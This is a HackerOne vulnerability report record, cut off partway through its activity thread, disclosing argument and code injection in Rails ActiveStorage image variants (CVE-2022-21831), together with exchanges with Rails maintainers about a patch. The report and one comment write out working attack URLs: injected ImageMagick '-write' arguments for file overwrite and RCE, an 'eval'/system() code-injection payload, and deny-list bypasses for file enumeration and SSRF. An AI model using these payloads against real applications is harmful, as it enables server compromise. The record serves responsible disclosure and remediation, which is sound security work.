{
  "id": 1154034,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMTU0MDM0",
  "url": "https://hackerone.com/reports/1154034",
  "title": "Argument/Code Injection via ActiveStorage's image transformation functionality",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "high",
  "readable_substate": "Resolved",
  "created_at": "2021-04-07T03:05:50.031Z",
  "submitted_at": "2021-04-07T03:05:50.107Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "gquadros_",
    "url": "/gquadros_",
    "profile_picture_urls": {
      "small": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 22,
    "url": "https://hackerone.com/rails",
    "handle": "rails",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/022/5e2b46658c8b86bed62f574d8e1793f353cbbc63_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/022/5e2b46658c8b86bed62f574d8e1793f353cbbc63_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [

    ],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Ruby on Rails",
      "twitter_handle": "rails",
      "website": "http://rubyonrails.org/security",
      "about": "Web development that doesn't hurt."
    }
  },
  "has_bounty?": false,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": true,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [
    "CVE-2022-21831"
  ],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2023-07-28T00:45:12.641Z",
  "bug_reporter_agreed_on_going_public_at": null,
  "team_member_agreed_on_going_public_at": "2023-06-28T00:45:10.236Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "# Affected components\n\nTested on:\n\n1. activestorage 6.1.3.1\n2. image\\_processing 1.12.1\n3. mini\\_magick 4.11.0\n\n# Found by\n\nGabriel Quadros and Ricardo Silva from Conviso Application Security\n\n# Description\n\n## Intro\n\nActiveStorage has an image transformation functionality [1, 2, 3, 4, 5, 6] which uses the concept of *variants*. By their own words [5]:\n\n> Image blobs can have variants that are the result of a set of transformations applied to the original. These variants are used to create thumbnails, fixed-size avatars, or any other derivative image from the original.\n\n> Variants rely on ImageProcessing gem for the actual transformations of the file, so you must add gem \"image\\_processing\" to your Gemfile if you wish to use variants. By default, images will be processed with ImageMagick using the MiniMagick gem, but you can also switch to the libvips processor operated by the ruby-vips gem).\n\nOne example of direct usage can be seen in the docs as:\n\n```ruby\n<%= image_tag user.avatar.variant(resize_to_limit: [100, 100]) %>\n```\n\nThis will create an image tag with a variant URL, which when visited will return the *avatar* image transformed to the new size.\n\nAnother example uses the *preview()* method, which can be used to generate images from videos and PDF files. Once the preview image is generated, it also calls *variant()* under the hood.\n\n```html\n<ul>\n  <% @message.files.each do |file| %>\n    <li>\n      <%= image_tag file.preview(resize_to_limit: [100, 100]) %>\n    </li>\n  <% end %>\n</ul>\n```\n\n## Vulnerabilities\n\nFirst, it is worth noting that the docs [3, 4, 7] do not state anything about it being insecure to pass user-supplied values as arguments to the *variant()/preview()* methods.\n\nRails uses the gem ImageProcessing [8] with MiniMagick by default, passing the transformations to the *apply* method.\n\n**File:** activestorage/lib/active\\_storage/transformers/image\\_processing\\_transformer.rb\n```ruby\n 12 module ActiveStorage                                                          \n 13   module Transformers                                                         \n 14     class ImageProcessingTransformer < Transformer                            \n 15       private                                                                 \n 16         def process(file, format:)                                            \n 17           processor.                                                          \n 18             source(file).                                                     \n 19             loader(page: 0).                                                  \n 20             convert(format).                                                  \n 21             apply(operations).                                                \n 22             call                                                              \n 23         end\n```\n\nThis method passes these operations to the *builder* object by iterating over them and calling methods providing arguments, as can be seen below.\n\n**File:** lib/image\\_processing/chainable.rb\n```ruby\n 24     # Add multiple operations as a hash or an array.                          \n 25     #                                                                         \n 26     #   .apply(resize_to_limit: [400, 400], strip: true)                      \n 27     #   # or                                                                  \n 28     #   .apply([[:resize_to_limit, [400, 400]], [:strip, true])               \n 29     def apply(operations)                                                     \n 30       operations.inject(self) do |builder, (name, argument)|                  \n 31         if argument == true || argument == nil                                \n 32           builder.send(name)                                                  \n 33         elsif argument.is_a?(Array)                                           \n 34           builder.send(name, *argument)                                       \n 35         elsif argument.is_a?(Hash)                                            \n 36           builder.send(name, **argument)                                      \n 37         else                                                                  \n 38           builder.send(name, argument)                                        \n 39         end                                                                   \n 40       end                                                                     \n 41     end\n```\n\nAt some point, ImageProcessing passes these operations to MiniMagick via method calling as well:\n\n**File:** lib/image\\_processing/processor.rb\n```ruby\n 51     # Calls the operation to perform the processing. If the operation is      \n 52     # defined on the processor (macro), calls the method. Otherwise calls the \n 53     # operation directly on the accumulator object. This provides a common    \n 54     # umbrella above defined macros and direct operations.                    \n 55     def apply_operation(name, *args, &block)                                  \n 56       receiver = respond_to?(name) ? self : @accumulator                      \n 57                                                                               \n 58       if args.last.is_a?(Hash)                                                \n 59         kwargs = args.pop                                                     \n 60         receiver.public_send(name, *args, **kwargs, &block)                   \n 61       else                                                                    \n 62         receiver.public_send(name, *args, &block)                             \n 63       end                                                                     \n 64     end\n```\n\nMiniMagick receives these operations by defining a *method\\_missing* method, which takes the called methods and convert them to CLI options:\n\n**File:** lib/mini\\_magick/tool.rb\n```ruby\n260     ##                                                                        \n261     # Any undefined method will be transformed into a CLI option              \n262     #                                                                         \n263     # @example                                                                \n264     #   mogrify = MiniMagick::Tool.new(\"mogrify\")                             \n265     #   mogrify.adaptive_blur(\"...\")                                          \n266     #   mogrify.foo_bar                                                       \n267     #   mogrify.command.join(\" \") # => \"mogrify -adaptive-blur ... -foo-bar\"  \n268     #                                                                         \n269     def method_missing(name, *args)                                           \n270       option = \"-#{name.to_s.tr('_', '-')}\"                                   \n271       self << option                                                          \n272       self.merge!(args)                                                       \n273       self                                                                    \n274     end\n```\n\n### Argument Injection\n\nThe first problem arrises when a user-supplied value is passed as input to a hard-coded transformation, such as:\n\n```ruby\n<%= image_tag user.avatar.variant(resize: params[:new_size]) %>\n```\n\nSince Rails *params[]* can be an array, one thing the attacker could do here is to pass an array and inject arbitrary arguments into the command to be executed (ImageMagick's convert by default).\n\nExample:\n\n```\nhttps://example.com/controller?new_size[]=123&new_size[]=-set&new_size[]=comment&new_size[]=MYCOMMENT&new_size[]=-write&new_size[]=/tmp/file.erb\n```\n\nThis is going to generate the following command:\n\n```\nconvert ORIGINAL_IMAGE -auto-orient -resize 123 -set comment MYCOMMENT -write /tmp/file.erb /tmp/image_processing20210328-23426-63rmm2.png\n```\n\nWhich has the effect of writing a file containing user-controlled data anywhere in the system. This could be used easily to achieve RCE against Rails applications by overwriting ERB files, for example.\n\n### User-controlled transformation\n\nA second problem arrises when the user is also allowed to choose the kind of transformation to be applied, such as:\n\n```ruby\n<%= image_tag user.avatar.variant(params[:t].to_s => params[:v].to_s) %>\n```\n\nThis is still dangerous since ImageMagick's convert program has a lot of powerful command-line options and they can be used to compromise the application. For example, the user could pass:\n\n```\nhttps://example.com/controller?t=write&v=/tmp/file2.erb\n```\n\nThis is going to generate the following command:\n\n```\nconvert ORIGINAL_IMAGE -auto-orient -write /tmp/file2.erb /tmp/image_processing20210328-23426-63rmm2.png\n```\n\nWhich has a similar effect as the previous attack, if we consider the original image is usually user-controlled.\n\n### Code Injection\n\nThe third problem occurs due the way ImageProcessing passes the operations to the *builder* object (via *send()*). There is no filtering to check if the called method is a valid operation and this can be explored by an attacker to execute code.\n\nConsider the same pattern as before:\n\n```ruby\n<%= image_tag user.avatar.variant(params[:t].to_s => params[:v].to_s) %>\n```\n\nThe attacker could pass:\n\n```\nhttps://example.com/controller?t=eval&v=system(\"touch /tmp/hacked\")\n```\n\nAnd the Ruby code *system(\"touch /tmp/hacked\")* would be executed.\n\n# Recomendations\n\n1. Add some notes in the documentation to warn developers about the dangers of passing user-supplied data to the affected methods (*variant/preview*) without sanitization;\n2. Fix the argument injection problem;\n3. Implement an operations whitelist in ImageProcessing, so it won't call unexpected methods.\n\n# References\n\n1. https://guides.rubyonrails.org/active_storage_overview.html#transforming-images\n2. https://guides.rubyonrails.org/active_storage_overview.html#previewing-files\n3. https://api.rubyonrails.org/v6.1.3.1/classes/ActiveStorage/Blob/Representable.html#method-i-variant\n4. https://api.rubyonrails.org/v6.1.3.1/classes/ActiveStorage/Blob/Representable.html#method-i-preview\n5. https://api.rubyonrails.org/v6.1.3.1/classes/ActiveStorage/Variant.html\n6. https://api.rubyonrails.org/v6.1.3.1/classes/ActiveStorage/Preview.html\n7. https://github.com/rails/rails/issues/32989\n8. https://github.com/janko/image_processing\n\n## Impact\n\nVulnerable code patterns could allow the attacker to achieve RCE.",
  "weakness": {
    "id": 70,
    "name": "Code Injection"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [

  ],
  "allow_singular_disclosure_at": "2023-07-28T00:45:10.382Z",
  "allow_singular_disclosure_after": -4946930.167477167,
  "singular_disclosure_allowed": true,
  "vote_count": 24,
  "voters": [
    "zy9ard3",
    "neil-tsakatsa",
    "ubercomp",
    "security_sphinx",
    "kerolesmagdy",
    "vlakhani28",
    "paler",
    "shivammusic",
    "prit3shh",
    "albert07",
    "and 14 more..."
  ],
  "severity": {
    "rating": "high",
    "author_type": "User"
  },
  "structured_scope": {
    "databaseId": 160,
    "asset_type": "SOURCE_CODE",
    "asset_identifier": "https://github.com/rails/rails",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [

    ],
    "assignable_team_member_groups": [

    ]
  },
  "activities": [
    {
      "id": 11291335,
      "is_internal": false,
      "editable": false,
      "type": "Activities::ReportCollaboratorInvited",
      "message": null,
      "automated_response": false,
      "created_at": "2021-04-07T03:09:04.483Z",
      "updated_at": "2021-04-07T03:09:04.483Z",
      "actor": {
        "username": "gquadros_",
        "cleared": false,
        "verified": false,
        "url": "/gquadros_",
        "profile_picture_urls": {
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "rails"
    },
    {
      "id": 11291715,
      "is_internal": false,
      "editable": false,
      "type": "Activities::ReportCollaboratorJoined",
      "message": "",
      "automated_response": false,
      "created_at": "2021-04-07T03:32:45.935Z",
      "updated_at": "2021-04-07T03:32:45.935Z",
      "actor": {
        "username": "rsilva",
        "cleared": false,
        "verified": false,
        "url": "/rsilva",
        "profile_picture_urls": {
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "rails"
    },
    {
      "id": 11382337,
      "is_internal": false,
      "editable": false,
      "type": "Activities::BugTriaged",
      "message": "Thanks for the report! We’ll evaluate remediation options and get back to you.",
      "automated_response": false,
      "created_at": "2021-04-13T16:22:36.231Z",
      "updated_at": "2021-04-13T16:22:36.231Z",
      "actor": {
        "username": "georgeclaghorn",
        "cleared": false,
        "verified": false,
        "url": "/georgeclaghorn",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/019/774/ca6398181b4bb7b5b1b34ac9c1fb592a799e9239_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "rails"
    },
    {
      "id": 11480683,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Hi @georgeclaghorn. Do you have any update about this issue?",
      "automated_response": false,
      "created_at": "2021-04-22T14:35:55.068Z",
      "updated_at": "2021-04-22T14:35:55.068Z",
      "actor": {
        "username": "rsilva",
        "cleared": false,
        "verified": false,
        "url": "/rsilva",
        "profile_picture_urls": {
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "rails"
    },
    {
      "id": 11494169,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "I’ve emailed the maintainer of ImageProcessing about the code injection finding. We still need to decide how to implement your second recommendation.",
      "automated_response": false,
      "created_at": "2021-04-23T17:03:18.274Z",
      "updated_at": "2021-04-23T17:03:18.274Z",
      "actor": {
        "username": "georgeclaghorn",
        "cleared": false,
        "verified": false,
        "url": "/georgeclaghorn",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/019/774/ca6398181b4bb7b5b1b34ac9c1fb592a799e9239_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "rails"
    },
    {
      "id": 11495190,
      "is_internal": false,
      "editable": false,
      "type": "Activities::ExternalUserJoined",
      "message": "",
      "automated_response": false,
      "created_at": "2021-04-23T18:59:10.206Z",
      "updated_at": "2021-04-23T18:59:10.206Z",
      "actor": {
        "username": "jankomarohnic",
        "cleared": false,
        "verified": false,
        "url": "/jankomarohnic",
        "profile_picture_urls": {
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "rails"
    },
    {
      "id": 11613390,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Hi @georgeclaghorn. How are you? Any progress on this issue?",
      "automated_response": false,
      "created_at": "2021-05-04T13:59:18.696Z",
      "updated_at": "2021-05-04T13:59:18.696Z",
      "actor": {
        "username": "rsilva",
        "cleared": false,
        "verified": false,
        "url": "/rsilva",
        "profile_picture_urls": {
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "rails"
    },
    {
      "id": 11613525,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Hi @rsilva, unfortunately George has decided to step down from Rails Core after leaving Basecamp so I'll be picking up this bug - I can get back to you in a couple of days once I've found out what the situation is.",
      "automated_response": false,
      "created_at": "2021-05-04T14:13:33.418Z",
      "updated_at": "2021-05-04T14:13:33.418Z",
      "actor": {
        "username": "pixeltrix",
        "cleared": false,
        "verified": false,
        "url": "/pixeltrix",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/039/102/9b0da8bbd0acc4d73bb06f6be3e32cf87b6c4d25_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "rails"
    },
    {
      "id": 11613829,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Ok @pixeltrix. Thank you!",
      "automated_response": false,
      "created_at": "2021-05-04T14:35:50.750Z",
      "updated_at": "2021-05-04T14:35:50.750Z",
      "actor": {
        "username": "rsilva",
        "cleared": false,
        "verified": false,
        "url": "/rsilva",
        "profile_picture_urls": {
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "rails"
    },
    {
      "id": 11617531,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Hi,\n\nLooking at the example code:\n\n```\n<%= image_tag user.avatar.variant(params[:t].to_s => params[:v].to_s) %>\n```\n\nAre the `to_s` calls in order to bypass strong parameters?  We should definitely fix this, but if the app developer has to do something to specifically pass in untrusted strings, then the attack scenario isn't as common as I thought it might be.",
      "automated_response": false,
      "created_at": "2021-05-04T20:25:43.305Z",
      "updated_at": "2021-05-04T20:25:43.305Z",
      "actor": {
        "username": "tenderlove",
        "cleared": false,
        "verified": false,
        "url": "/tenderlove",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/003/318/60d828744b5d16813ecbf975fdc453dc4a933f4f_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "rails"
    },
    {
      "id": 11619482,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Hi, these 'to_s' calls are not necessary. It was just a way to differentiate from the first exploitation scenario (Argument Injection), which needs an array as input. It shows that even if you convert to string, you can get in trouble.",
      "automated_response": false,
      "created_at": "2021-05-04T22:13:24.863Z",
      "updated_at": "2021-05-04T22:13:24.863Z",
      "actor": {
        "username": "gquadros_",
        "cleared": false,
        "verified": false,
        "url": "/gquadros_",
        "profile_picture_urls": {
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "rails"
    },
    {
      "id": 11960796,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Hi guys. Any update about this issue?",
      "automated_response": false,
      "created_at": "2021-06-02T14:44:03.194Z",
      "updated_at": "2021-06-02T14:44:03.194Z",
      "actor": {
        "username": "rsilva",
        "cleared": false,
        "verified": false,
        "url": "/rsilva",
        "profile_picture_urls": {
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "rails"
    },
    {
      "id": 12404792,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Hi @pixeltrix @tenderlove @jankomarohnic, any update about this issue? Let us know if you have any questions.\n\nCheers",
      "automated_response": false,
      "created_at": "2021-07-08T15:50:04.803Z",
      "updated_at": "2021-07-08T15:50:04.803Z",
      "actor": {
        "username": "gquadros_",
        "cleared": false,
        "verified": false,
        "url": "/gquadros_",
        "profile_picture_urls": {
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "rails"
    },
    {
      "id": 13369788,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Howdy @gquadros_ ,\n\nThanks again for the report and sorry for the delay. This report ended up moving through a number of different people.\n\nWhile I'm not convinced that the root cause of this behavior is in rails, I agree that we should be doing a better job of validating user supplied input for transformations.\n\nIn order to do that, I broke the issue down into situations where the attacker controls either the transformation method name, the parameters, or both.\n\nFor method names, rails would enforce a configurable allow-list with a set of default, known safe [imagemagick methods](https://imagemagick.org/script/command-line-options.php).\n\nFor parameters, I opted for a deny-list. The only other option I could see is to create an exhaustive allow-list that attempts to account for every possible permutation of all possible parameter types supported by imagemagick. While not ideal, a deny list _should_ do the trick here. The minimagick gem calls out to the system shell in a way that [prevents shell expansion](https://github.com/minimagick/minimagick/blob/master/lib/mini_magick/shell.rb#L28).\n\nIn other words, you can't do something like `-wr$(echo)ite` to evade the denylist. Curious if anyone can spot a bypass I'm overlooking?\n\nAttached are the proposed patches for `5.2`, `6.0` and `6.1`.",
      "automated_response": false,
      "created_at": "2021-09-08T15:33:59.386Z",
      "updated_at": "2021-09-08T15:33:59.386Z",
      "actor": {
        "username": "zack_spotify",
        "cleared": false,
        "verified": false,
        "url": "/zack_spotify",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/261/793/78a81f701248b9e632d5de7b037e5e0eedd37560_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "attachments": [
        {
          "id": 1441262,
          "filename": "variant_processor_6_0_and_6_1.patch",
          "type": "text/x-diff",
          "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/bpkqjs2jjnu6mlfshxvwzro5wxvl?response-content-disposition=attachment%3B%20filename%3D%22variant_processor_6_0_and_6_1.patch%22%3B%20filename%2A%3DUTF-8%27%27variant_processor_6_0_and_6_1.patch&response-content-type=text%2Fx-diff&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQZ363NV4N%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T065400Z&X-Amz-Expires=1454&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECkaCXVzLXdlc3QtMiJHMEUCIQCUKMH71SIb%2FoTww4o7Fyp5mQhZVTwsH6dhlfwUD7S8TwIgF4Omzzgoy7Eh%2FuuaDn6bJadywjrFCwcrXLyPd1UCs5kqsQUIIhADGgwwMTM2MTkyNzQ4NDkiDKGxZrCtnfrI2eKhbiqOBXD0daRtK7nXN8bU4wh8rs0TwC9%2FcJa7QcdjP2SAL2YxL6GkwLVHnakg45WQ%2BWk4Adhd6eDu4AekBKcLFkFd8k%2Fd5lubZW1GVCKCIIzX8mIHtiR6NWgAL1RYXyLJqsBolJgkbfAKgnxB2VBNu9cqdN0Sg6q46Ilnq1hqExJMLfqht15NsELU1U%2FQ19p63tws1LUaitduuiCmfbNrtck%2BJiuxte1AqtVx350x7u7AVd0SqMQXMgYhUrdnfQGkHw4PKw01gqvsRv0qYiR5T%2BJ02lVmbMGvHW0qzI3DYYUFIGfXcUFnGQSIaE%2FgPqRPsEBM6Lwmyz7ekYcfG4NAQPkX7s7d3l%2BAxF8xABewHt3siqiqDRwd%2BQ4qbNSRRB2PkDbmZ1eHzYDk4QbTDmVKIFyPKrkIkVF4XR4g2Coeli7hvF%2BckBOmv0p8iVYfRcyovSIhcdl6kBxgYFShVu%2FoppYowWnD2wehXrreQsVGuk%2FSEDklipqIstWBh044DkhjHK38BO2tKoCbBEd3HL%2F%2BCSTk87EjIAnzFVx1G%2Bg0F2Yj%2FB8WgRs4oGUj%2F%2FugSeXVb7VtlulwRZSm%2BK3L%2BBvsp0VDMXQNBHJyKN5tTlj1qWo5o325Ubas8A3WgFHAJYPgq4gNHNsbElI8w6eB%2BoTxkjdH2%2B5YcHseEpZR6D9yp11HZu1B1Z9ccVeEbWoll9F%2Fl90jl7Darf0cRBdETJBVQe9lES5xsNEsTzJCU0hJC7cbhVgiFsvjy%2BsmVYuW%2BJ0Ir2DYYd%2BEAKSEPkMQzbR5JEOhhY35l4K5u%2FzDZNGAuBAAEQtj%2F79KdtjYW%2Fo3zHs0RmQMmpWUybphGAceZplAaCh5JeuSBsicB56wWgZXYoeowzDl%2BLioBjqxAavr89KptASCwoBoIcJJ1%2F%2F5OLzjaOfXS9rhOyPfMD4r39NrVSBqOuZEqOKLh8OZun7ZmvuZ6d%2Bu0%2Fq3yH0BFxg8fSuBxWsADt3u8ZMwDmRFAsTmr%2Fi0BfAgyXp3o3mJLIlnT3C6KGPZgG5zSxpe1VPmWP4RCUXcoIqHJJNfyToajUXSYsPPP%2FGEYB7eJNBTLXBAPJRkz74FOOGIE7hFLR1tttCq48hFanfnz69J0GhsHA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=788a967d779860980359643d61e9d07dd49242254b5324658ad6e5d1e58c51a6"
        },
        {
          "id": 1441261,
          "filename": "variant_processor_5_2.patch",
          "type": "text/x-diff",
          "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/0no9cuu21up1leof5rhgrlkqos6k?response-content-disposition=attachment%3B%20filename%3D%22variant_processor_5_2.patch%22%3B%20filename%2A%3DUTF-8%27%27variant_processor_5_2.patch&response-content-type=text%2Fx-diff&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQZ363NV4N%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T065400Z&X-Amz-Expires=1454&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECkaCXVzLXdlc3QtMiJHMEUCIQCUKMH71SIb%2FoTww4o7Fyp5mQhZVTwsH6dhlfwUD7S8TwIgF4Omzzgoy7Eh%2FuuaDn6bJadywjrFCwcrXLyPd1UCs5kqsQUIIhADGgwwMTM2MTkyNzQ4NDkiDKGxZrCtnfrI2eKhbiqOBXD0daRtK7nXN8bU4wh8rs0TwC9%2FcJa7QcdjP2SAL2YxL6GkwLVHnakg45WQ%2BWk4Adhd6eDu4AekBKcLFkFd8k%2Fd5lubZW1GVCKCIIzX8mIHtiR6NWgAL1RYXyLJqsBolJgkbfAKgnxB2VBNu9cqdN0Sg6q46Ilnq1hqExJMLfqht15NsELU1U%2FQ19p63tws1LUaitduuiCmfbNrtck%2BJiuxte1AqtVx350x7u7AVd0SqMQXMgYhUrdnfQGkHw4PKw01gqvsRv0qYiR5T%2BJ02lVmbMGvHW0qzI3DYYUFIGfXcUFnGQSIaE%2FgPqRPsEBM6Lwmyz7ekYcfG4NAQPkX7s7d3l%2BAxF8xABewHt3siqiqDRwd%2BQ4qbNSRRB2PkDbmZ1eHzYDk4QbTDmVKIFyPKrkIkVF4XR4g2Coeli7hvF%2BckBOmv0p8iVYfRcyovSIhcdl6kBxgYFShVu%2FoppYowWnD2wehXrreQsVGuk%2FSEDklipqIstWBh044DkhjHK38BO2tKoCbBEd3HL%2F%2BCSTk87EjIAnzFVx1G%2Bg0F2Yj%2FB8WgRs4oGUj%2F%2FugSeXVb7VtlulwRZSm%2BK3L%2BBvsp0VDMXQNBHJyKN5tTlj1qWo5o325Ubas8A3WgFHAJYPgq4gNHNsbElI8w6eB%2BoTxkjdH2%2B5YcHseEpZR6D9yp11HZu1B1Z9ccVeEbWoll9F%2Fl90jl7Darf0cRBdETJBVQe9lES5xsNEsTzJCU0hJC7cbhVgiFsvjy%2BsmVYuW%2BJ0Ir2DYYd%2BEAKSEPkMQzbR5JEOhhY35l4K5u%2FzDZNGAuBAAEQtj%2F79KdtjYW%2Fo3zHs0RmQMmpWUybphGAceZplAaCh5JeuSBsicB56wWgZXYoeowzDl%2BLioBjqxAavr89KptASCwoBoIcJJ1%2F%2F5OLzjaOfXS9rhOyPfMD4r39NrVSBqOuZEqOKLh8OZun7ZmvuZ6d%2Bu0%2Fq3yH0BFxg8fSuBxWsADt3u8ZMwDmRFAsTmr%2Fi0BfAgyXp3o3mJLIlnT3C6KGPZgG5zSxpe1VPmWP4RCUXcoIqHJJNfyToajUXSYsPPP%2FGEYB7eJNBTLXBAPJRkz74FOOGIE7hFLR1tttCq48hFanfnz69J0GhsHA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=54dfdcdecbca877039377c779c9c215a795a97ef371eefb4949f516962ed41e2"
        }
      ],
      "genius_execution_id": null,
      "team_handle": "rails"
    },
    {
      "id": 13494870,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Hi @zack_spotify,\n\nWe tested the patch and found some bypasses.\n\nConsidering the following code:\n\n```ruby\n<%= image_tag blob.preview(params[:t] => params[:v]) %>\n```\n\n1) Blocklist bypass with upper case letters\n\n```\n?t=resize&v[]=123&v[]=-seT&v[]=comment&v[]=MYCOMMENT&v[]=-writE&v[]=/tmp/file.erb\n```\n\n2) File enumeration (error based)\n\n```\n?t=resize&v[]=100&&v[]=-size&v[]=1x1&v[]=-remap&v[]=gray:/etc/issue\n?t=resize&v[]=100&&v[]=-size&v[]=1x1&v[]=-remap&v[]=gray:/etc/issuex\n```\n\n3) SSRF - ImageMagick tries to get an image located at the URL\n\n```\n?t=resize&v[]=100&v[]=http://localhost:4444/xxx\n```\n\nThere are probably other ways to exploit it.\n\nIt could be a good idea to remove methods which support filenames as arguments from the allow-list, such as cdl, clip-mask, decipher, encipher, etc. Although the deny-list is not the best solution, your implementation could be improved by doing a case-insensitive comparison and maybe also blocking anything containing special characters such as -, @, /, :, etc.\n\nIt is also important to warn developers in the documentation about the dangers of passing user-supplied data to the affected methods (variant/preview) without sanitization.\n\nRegards,\n",
      "automated_response": false,
      "created_at": "2021-09-16T21:00:21.252Z",
      "updated_at": "2021-09-16T21:00:21.252Z",
      "actor": {
        "username": "gquadros_",
        "cleared": false,
        "verified": false,
        "url": "/gquadros_",
        "profile_picture_urls": {
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "rails"
    },
    {
      "id": 13765827,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
